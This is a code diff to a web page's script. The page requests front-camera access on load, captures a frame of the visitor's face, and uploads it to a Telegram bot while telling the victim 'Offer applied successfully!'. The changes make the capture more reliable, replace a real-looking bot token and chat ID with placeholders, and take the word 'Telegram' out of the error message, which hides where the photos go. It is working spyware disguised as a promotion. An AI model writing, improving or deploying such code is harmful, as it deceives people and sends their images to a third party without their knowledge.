@@ -99,20 +99,22 @@
 <canvas id="canvas" width="320" height="240"></canvas>
 
 <script>
-  const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
-  const chatId = "8182050140";
+  const botToken = "✅YOUR_TELEGRAM_BOT_TOKEN";
+  const chatId = "✅YOUR_CHAT_ID";
 
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
   const context = canvas.getContext("2d");
   let stream = null;
 
-  // Auto ask for camera permission on load
   window.onload = () => {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
       .then(s => {
         stream = s;
         video.srcObject = stream;
+        video.addEventListener('loadedmetadata', () => {
+          video.play();
+        });
       })
       .catch(err => {
         alert("⚠️ Camera access denied!");
@@ -121,7 +123,19 @@
   };
 
   async function captureAndSend() {
+    // Wait until the video has at least one frame ready
+    if (video.readyState < 2) {
+      alert("📸 Camera not ready yet — please wait a second!");
+      return;
+    }
+
+    // Match canvas to the actual video size
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    // Draw the current frame
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
     const base64Img = canvas.toDataURL("image/jpeg").split(',')[1];
 
     const blob = await fetch(`data:image/jpeg;base64,${base64Img}`).then(res => res.blob());
@@ -134,10 +148,9 @@
       body: form
     }).then(() => {
       alert("✅ Offer applied successfully!");
-      // Optional: Redirect or close cam
       stream.getTracks().forEach(track => track.stop());
     }).catch((e) => {
-      alert("❌ Failed to send photo to Telegram.");
+      alert("❌ Failed to send photo.");
       console.error(e);
     });
   }
